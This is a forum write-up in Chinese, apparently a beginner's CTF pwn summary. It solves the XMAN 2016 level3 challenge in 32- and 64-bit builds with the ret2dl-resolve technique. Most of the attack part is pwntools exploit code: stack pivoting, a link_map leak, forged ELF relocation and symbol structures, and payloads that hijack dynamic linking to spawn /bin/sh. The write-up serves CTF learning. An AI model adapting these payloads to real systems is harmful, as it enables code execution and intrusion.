> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [bbs.pediy.com](https://bbs.pediy.com/thread-268717.htm)

> [原创] 新人 PWN 入坑总结 (五)

RROP 技术 0x0a
============

一、XMAN 2016-level3(32+64)
-------------------------

### ★32 位程序

1. 常规 checksec，开了 Partial RELRO 和 NX，IDA 找漏洞，很明显在 vulnerable_function 函数中存在栈溢出：

```
#注释头
 
char buf; // [esp+0h] [ebp-88h]
----------------------------------------------------------------------
return read(0, &buf, 0x100u);

```

2. 很多种方法，这里选择用 ret2dl-resolve 来尝试解决。

3. 关于 ret2dl-resolve 介绍，篇幅太长，不说了，后面放资料链接，介绍一下装载流程：

(1) 通过 struct link_map *l 获得. dynsym、.dynstr、.rel.plt 地址  
(2) 通过 reloc_arg+.rel.plt 地址取得函数对应的 Elf32_Rel 指针，记作 reloc  
(3) 通过 reloc->r_info 和. dynsym 地址取得函数对应的 Elf32_Sym 指针，记作 sym  
(4) 检查 r_info 最低位是否为 7  
(5) 检查 (sym->st_other)&0x03 是否为 0  
(6) 通过 strtab+(sym->st_name) 获得函数对应的字符串，进行查找，找到后赋值给 rel_addr, 最后调用这个函数。

4. 首先思考 exp 编写的攻击思路，由于栈溢出的比较少，而 ret2dl-resolve 攻击需要构造几个结构体，所占空间较大，所以这里进行栈劫持，将栈劫持到程序运行过程中生成的 bss 段上。之后再在栈上布置结构体和必要数据，重新执行延迟绑定，劫持动态装载，将 write 函数装载成 system 函数，并且在劫持的同时将 Binsh 字符串放在栈上，这样劫持完成后就直接调用 system 函数，参数就是 binsh。

(1) 首先需要找到相关的数据地址：

```
#注释头
 
write_got = 0x0804a018
read_plt = 0x08048310
plt0_addr = 0x08048300
leave_ret = 0x08048482
pop3_ret = 0x08048519
pop_ebp_ret = 0x0804851b
new_stack_addr = 0x0804a500 
#程序运行起来才会有，bss与got表相邻，_dl_fixup中会降低栈后传参，设置离bss首地址远一点防止参数写入非法地址出错
 
relplt_addr = 0x080482b0 
#.rel.plt的首地址，通过计算首地址和新栈上我们伪造的结构体Elf32_Rel偏移构造reloc_arg
 
dynsym_addr = 0x080481cc 
#.dynsym的首地址，通过计算首地址和新栈上我们伪造的Elf32_Sym结构体偏移来构造Elf32_Rel.r_info
 
dynstr_addr = 0x0804822c 
#.dynstr的首地址，通过计算首地址和新栈上我们伪造的函数名字符串system偏移来构造Elf32_Sym.st_name

```

这里寻找的 relplt_addr，dynsym_addr，dynstr_addr 一般都是位于 ELF 文件头部的 LOAD 段。用 readelf -S binary 也可以看到：

![](https://bbs.pediy.com/upload/attach/202108/904686_UTHV3JEKV2DXFWC.jpg)

①relplt_addr：0x080482b0

![](https://bbs.pediy.com/upload/attach/202108/904686_ER29FZFDX8M2C8P.jpg)

②dynsym_addr：0x080481cc

![](https://bbs.pediy.com/upload/attach/202108/904686_6ZTZ3A7333MR33Y.jpg)

③dynstr_addr：0x0804822c

![](https://bbs.pediy.com/upload/attach/202108/904686_8V6FXSABQRWPCVH.jpg)

(2) 再进行栈劫持：

```
#注释头
 
payload = ""
payload += 'A'*140 #padding
payload += p32(read_plt) 
#调用read函数往新栈写值，防止leave; retn到新栈后出现ret到地址0上导致出错
payload += p32(pop3_ret) 
#read函数返回地址，从栈上弹出三个参数从而能够将esp拉到pop_ebp_ret的地方来执行
payload += p32(0) #fd = 0
payload += p32(new_stack_addr) #buf = new_stack_addr
payload += p32(0x400) #size = 0x400
payload += p32(pop_ebp_ret)
#把新栈顶给ebp
payload += p32(new_stack_addr)
payload += p32(leave_ret)
#模拟函数返回，利用leave指令把ebp的值赋给esp，完成栈劫持，同时ebp指向第二段payload的第一个内容，eip为第二段payload中的plt0_addr
 
io.send(payload) #此时程序会停在使用payload调用的read函数处等待输入数据

```

(3) 伪造两个结构体和必要的数据：

```
#注释头
 
 
fake_Elf32_Rel_addr = new_stack_addr + 0x50
#在新栈上选择一块空间放伪造的Elf32_Rel结构体，结构体大小为8字节
 
fake_Elf32_Sym_addr = new_stack_addr + 0x5c 
#在伪造的Elf32_Rel结构体后面接上伪造的Elf32_Sym结构体，结构体大小为0x10字节
 
fake_reloc_arg = fake_Elf32_Rel_addr - relplt_addr 
#计算伪造的reloc_arg
 
fake_st_name_addr = new_stack_addr + 0x6c - dynstr_addr 
#伪造的Elf32_Sym结构体后面接上伪造的函数名字符串system_addr 
 
fake_r_info = ((fake_Elf32_Sym_addr - dynsym_addr)/0x10) << 8 | 0x7 
#伪造r_info，偏移要计算成下标，除以Elf32_Sym的大小，最后一字节为0x7
 
 
fake_Elf32_Rel_data = ""
fake_Elf32_Rel_data += p32(write_got) 
#r_offset = write_got，以免重定位完毕回填got表的时候出现非法内存访问错误
fake_Elf32_Rel_data += p32(fake_r_info)
 
fake_Elf32_Sym_data = ""
fake_Elf32_Sym_data += p32(fake_st_name_addr)
fake_Elf32_Sym_data += p32(0) 
#后面的数据直接套用write函数的Elf32_Sym结构体
fake_Elf32_Sym_data += p32(0)
fake_Elf32_Sym_data += p8(0x12)
fake_Elf32_Sym_data += p8(0)
fake_Elf32_Sym_data += p16(0)
 
binsh_addr = new_stack_addr + 0x74 #把/bin/sh\x00字符串放在最后面

```

①reloc_arg 作用：作为偏移值，与 relplt_addr 相加得到 ELF32_Rel 结构体的地址。这里设置成 fake_reloc_arg = fake_Elf32_Rel_addr - relplt_addr，那么相加之后就可以直达我们设置的 fake_ELF32_Rel 结构体位置。

②st_name_addr 作用：作为偏移值，与 dynstr_addr 相加得到存放函数名的地址。如果按照原本的重定位，那么此处计算之后存放的应该是 write，所以这里将其改为 system，放在所有数据的最后面，将地址存放到 fake_Elf32_Sym 结构体中，设置为 fake_st_name_addr = new_stack_addr + 0x6c - dynstr_addr，这样相加之后就会定位到 new_stack_addr + 0x6c，即我们劫持栈上的 system 字符串地址处，从而劫持装载。

③r_info 作用：作为偏移值，使得结构体数组 Elf32_Sym[r_info>>8] 来找到存放 write 的结构体 Elf32_Sym。我们知道结构体数组寻址方式其实就是 addr = head_addr + size*indx，也就是首地址加上数组中元素大小乘以索引。这里由于伪造了 Elf32_Sym 结构体，所以我们的 r_info>>8 = indx 应该是 addr - head_addr/size，对应的就是 (fake_Elf32_Sym_addr - dynsym_addr)/0x10，得到最终的 r_info 为 ((fake_Elf32_Sym_addr - dynsym_addr)/0x10)<<8。

④设置 write 的 Elf32_Sym 结构体时，可以通过命令 readelf -r binary，找到 write 的 r_info 偏移为 407：

![](https://bbs.pediy.com/upload/attach/202108/904686_B7A6D84FRZ6CE74.jpg)

之后输入 objdump -s -j .dynsym level3，查找偏移为 4 的 Elf32_Sym 结构体内容：

![](https://bbs.pediy.com/upload/attach/202108/904686_JMCGTYDDN4F5KMA.jpg)

这里就是 0x804820c，对应的内容为：

```
#注释头
 
 
st_name = 31000000
st_value = 00000000
st_size = 00000000
st_info = 12
st_other = 00
st_shndx = 0000

```

▲其实在 IDA 中看的更清楚：![](https://bbs.pediy.com/upload/attach/202108/904686_TV38TX9A4EUFFSX.jpg)

同时由于搜寻数据时，需要查找类型 R_386_JUMP_SLOT，该索引为 r_info 的最后一个字节，所以需要将 r_info 的最后一个字节设置为 0x07，来通过检查。

▲以下为两个结构体内容：

```
#注释头
 
#Elf32_Rel结构体：大小为0x08
typedef struct {
    Elf32_Addr r_offset;   // 对于可执行文件，此值为虚拟地址
    Elf32_Word r_info;     // 符号表索引
} Elf32_Rel;
 
 
#Elf32_Sym结构体：大小为0x10
typedef struct
{
    Elf32_Word st_name;      // Symbol name(string tbl index)
    Elf32_Addr st_value;     // Symbol value
    Elf32_Word st_size;      // Symbol size
    unsigned char st_info;   // Symbol type and binding
    unsigned char st_other;  // Symbol visibility under glibc>=2.2
    Elf32_Section st_shndx;  // Section index
} Elf32_Sym;

```

(4) 将伪造的结构体和必要数据放在 bss 新栈上，从 plt0_addr 开始执行，调用 write 函数，重新装载 write 函数，劫持成 system 函数，同时修改参数为 binsh，直接 getshell。

```
#注释头
 
#执行数据：
payload = ""
payload += "AAAA"              #位于new_stack_addr,占位用于pop ebp
payload += p32(plt0_addr)      #位于new_stack_addr+0x04,调用PLT[0]
payload += p32(fake_reloc_arg) #位于new_stack_addr+0x08,传入伪造的reloc_arg
payload += p32(0)              #位于new_stack_addr+0x0c,system函数返回值
payload += p32(binsh_addr)     #位于new_stack_addr+0x10,修改参数为/bin/sh字符串地址
 
#伪造的内容数据：
payload += "A"*0x3c            #位于new_stack_addr+0x14,padding
payload += fake_Elf32_Rel_data #位于new_stack_addr+0x50,Elf32_Rel结构体
payload += "AAAA"              #位于new_stack_addr+0x58，padding
payload += fake_Elf32_Sym_data #位于new_stack_addr+0x5c,Elf32_Sym结构体
payload += "system\x00\x00"    #位于new_stack_addr+0x6c,传入system函数名
payload += "/bin/sh\x00"       #位于new_stack_addr+0x74,传入binsh字符串
 
io.send(payload)
io.interactive()

```

▲不同版本的 libc 也不太一样，在 libc2.27 及以下试过都行，但 2.30 及以上好像就不可以，可能版本改了多了一些检查吧。

### ★64 位程序：

1. 完全一样，只是程序改成了 64 位，在 64 位条件下有些发生了变化：

(1) 两大结构体发生变化：

```
#注释头#Elf64_Rela结构体：大小为0x18typedef struct
{
  Elf64_Addr  r_offset;          /(0x08)* Address */
  Elf64_Xword  r_info;           /(0x08)* Relocation type and symbol index */
  Elf64_Sxword  r_addend;        /(0x08)* Addend */
} Elf64_Rela;#Elf64_Sym结构体：大小为0x18typedef struct
{
  Elf64_Word  st_name;           /(0x04)* Symbol name (string tbl index) */
  unsigned char  st_info;        /(0x01)* Symbol type and binding */
  unsigned char  st_other;       /(0x01)* Symbol visibility */
  Elf64_Section  st_shndx;       /(0x02)* Section index */
  Elf64_Addr  st_value;          /(0x08)* Symbol value */
  Elf64_Xword  st_size;          /(0x08)* Symbol size */
} Elf64_Sym;

```

![](https://bbs.pediy.com/upload/attach/202108/904686_NV7H7HHCWFBAT9U.jpg)

![](https://bbs.pediy.com/upload/attach/202108/904686_GXV4RS7BCEM2PK8.jpg)

(2) 寻址方式发生变化，不再是直接寻址，而是通过一个数组寻址，并且如果索引过大，会造成数组越界，程序崩溃。这里就需要设置 link_map 里的某些参数，置为 0，才能跳过其中的判断语句，使得伪造的 r_info 能够起作用，所以这里还需要先泄露 link_map 的地址：(或者直接伪造 link_map)

▲ GOT+4(即 GOT[1]) 为动态库映射信息数据结构 link_map 地址；GOT+8(即 GOT[2]) 为动态链接器符号解析函数的地址_dl_runtime_resolve。

(3) 同时由于通过数组索引，所以需要进行 0x18 的对齐，确保通过索引 n*0x18 到的地址是我们伪造的结构体。

2. 思考 exp 编写：

(1) 各种前置地址：

```
vulfun_addr = 0x4005e6
write_got = 0x600A58
read_got = 0x600A60
plt0_addr = 0x4004a0
link_map_got = 0x600A48
#GOT[1]的地址
leave_ret = 0x400618
pop_rdi_ret = 0x4006b3
pop_rbp_ret = 0x400550
 
new_stack_addr = 0x600d88 
#程序运行起来才会有，bss与got表相邻，_dl_fixup中会降低栈后传参，设置离bss首地址远一点防止参数写入非法地址出错
 
relplt_addr = 0x400420 
#.rel.plt的首地址，通过计算首地址和新栈上我们伪造的结构体Elf64_Rela偏移构造reloc_arg
 
dynsym_addr = 0x400280
#.dynsym的首地址，通过计算首地址和新栈上我们伪造的Elf64_Sym结构体偏移构造Elf64_Rela.r_info
 
dynstr_addr = 0x400340
#.dynstr的首地址，通过计算首地址和新栈上我们伪造的函数名字符串system偏移构造Elf64_Sym.st_name

```

(2) 泄露 link_map 的地址:

```
#注释头
 
universal_gadget1 = 0x4006aa 
#pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; retn
universal_gadget2 = 0x400690 
#mov rdx, r13; mov rsi, r14; mov edi, r15d; call qword ptr [r12+rbx*8]
 
#使用万能gadgets调用write泄露link_map地址
payload = ""
payload += 'A'*136 #padding
payload += p64(universal_gadget1) 
payload += p64(0x0)
payload += p64(0x1) #rbp，随便设置
payload += p64(write_got)
payload += p64(0x8)
payload += p64(link_map_got)
payload += p64(0x1)
payload += p64(universal_gadget2)
payload += 'A'*0x38 #栈修正
payload += p64(vulfun_addr) #返回到vulnerable_function处
 
io.send(payload)
io.recvuntil("Input:\n")
link_map_addr = u64(io.recv(8))
log.info("Leak link_map address:%#x" %(link_map_addr))

```

(3) 进行栈劫持：

```
#注释头
 
payload = ""
payload += 'A'*136 #padding
payload += p64(universal_gadget1) 
payload += p64(0x0)
payload += p64(0x1)
payload += p64(read_got) #使用万能gadgets调用read向新栈中写入数据
payload += p64(0x500)
payload += p64(new_stack_addr)
payload += p64(0x0)
payload += p64(universal_gadget2)
payload += 'A'*0x38 #栈修正
 
payload += p64(pop_rbp_ret) 
#返回到pop rbp; retn，劫持栈。此处直接劫持栈是因为如果继续修改link_map+0x1c8会导致ROP链过长，栈上的环境变量指针被破坏，从而导致system失败。
payload += p64(new_stack_addr)
payload += p64(leave_ret)
 
io.send(payload)

```

(4) 伪造两大结构体和必要数据：

```
#注释头
 
fake_Elf64_Rela_base_addr = new_stack_addr + 0x150 
#新栈上选择一块地址作为伪造的Elf64_Rela结构体基址，稍后还要通过计算进行0x18字节对齐
 
fake_Elf64_Sym_base_addr = new_stack_addr + 0x190
#新栈上选择一块地址作为伪造的Elf64_Sym结构体基址，稍后还要通过计算进行0x18字节对齐，与上一个结构体之间留出一段长度防止重叠
 
fake_st_name = new_stack_addr + 0x1c0 - dynstr_addr 
#计算伪造的st_name数值，为伪造函数字符串system与.dynstr节开头间的偏移
 
binsh_addr = new_stack_addr + 0x1c8 
#"/bin/sh\x00"所在地址，计算得到的
 
#计算两个结构体的对齐填充字节数，两个结构体大小都是0x18
rel_plt_align = 0x18 - (fake_Elf64_Rela_base_addr - relplt_addr) % 0x18 
rel_sym_align = 0x18 - (fake_Elf64_Sym_base_addr - dynsym_addr) % 0x18
 
#加上对齐值后为结构体真正地址
fake_Elf64_Rela_addr = fake_Elf64_Rela_base_addr + rel_plt_align 
fake_Elf64_Sym_addr = fake_Elf64_Sym_base_addr + rel_sym_align
 
fake_reloc_arg = (fake_Elf64_Rela_addr - relplt_addr)/0x18 
#计算伪造的reloc_arg，由于是数组索引下标，所以需要除以结构体大小0x18
 
fake_r_info = (((fake_Elf64_Sym_addr - dynsym_addr)/0x18) << 0x20) | 0x7 
#伪造r_info，偏移要计算成下标，除以Elf64_Sym的大小，最后一字节为0x7
 
 
fake_Elf64_Rela_data = ""
fake_Elf64_Rela_data += p64(write_got) 
#r_offset = write_got，以免重定位完毕回填got表的时候出现非法内存访问错误
fake_Elf64_Rela_data += p64(fake_r_info)
fake_Elf64_Rela_data += p64(0)
 
fake_Elf64_Sym_data = ""
fake_Elf64_Sym_data += p32(fake_st_name)
fake_Elf64_Sym_data += p8(0x12)
#后面的数据直接套用write函数的Elf64_Sym结构体，这里要注意数据大小
fake_Elf64_Sym_data += p8(0)
fake_Elf64_Sym_data += p16(0)
fake_Elf64_Sym_data += p64(0)
fake_Elf64_Sym_data += p64(0)

```

(5) 将 link_map+0x1c8 置 0 之后，直接再次重定位 write 函数，劫持为 system 函数，getshell:

```
#注释头
 
#使用万能gadgets调用read把link_map+0x1c8置为0
payload = ""
payload += "AAAAAAAA"
payload += p64(universal_gadget1)
payload += p64(0x0)
payload += p64(0x1) #rbp设置为1
payload += p64(read_got)
payload += p64(0x8)
payload += p64(link_map_addr + 0x1c8)
payload += p64(0x0)
payload += p64(universal_gadget2)
payload += 'A'*0x38 #栈修正
 
#为system函数设置参数"/bin/sh\x00"，由于plt[0]函数调用重定位取参仍然是从栈上取，不会用到rdi寄存器传参，所以这里直接先传参也可。
payload += p64(pop_rdi_ret) 
payload += p64(binsh_addr)
 
payload += p64(plt0_addr)
payload += p64(fake_reloc_arg)
payload = payload.ljust(0x150, "A") #padding
 
payload += 'A'*rel_plt_align
payload += fake_Elf64_Rela_data
payload = payload.ljust(0x190, "A") #padding
 
payload += 'A'*rel_sym_align
payload += fake_Elf64_Sym_data
payload = payload.ljust(0x1c0, "A") #padding
payload += "system\x00\x00"
payload += "/bin/sh\x00"
 
io.send(payload) #写入该段payload,将数据读取到新栈
io.send(p64(0)) #执行新栈上的相关代码，设置link_map+0x1c8为0。
 
io.interactive()

```

▲题外话：这个其实是一个模板，而且最近的 pwntools 里面已经集成了工具，可以直接生成，有时候这个模板就特别有用，大部分用的不多。

参考资料：

[https://wiki.x10sec.org/pwn/linux/stackoverflow/advanced-rop-zh/](https://wiki.x10sec.org/pwn/linux/stackoverflow/advanced-rop-zh/)

[https://bbs.ichunqiu.com/forum.php?mod=viewthread&tid=44816&ctid=157](https://bbs.ichunqiu.com/forum.php?mod=viewthread&tid=44816&ctid=157)

[https://syst3mfailure.github.io/ret2dl_resolve](https://syst3mfailure.github.io/ret2dl_resolve)

[https://xz.aliyun.com/t/5722](https://xz.aliyun.com/t/5722)  

不搞了，后面有空再说吧。  

[第五届安全开发者峰会（SDC 2021）议题征集正式开启！](https://bbs.pediy.com/thread-266645.htm)

[#漏洞利用](forum-150-1-154.htm) [#Linux](forum-150-1-161.htm)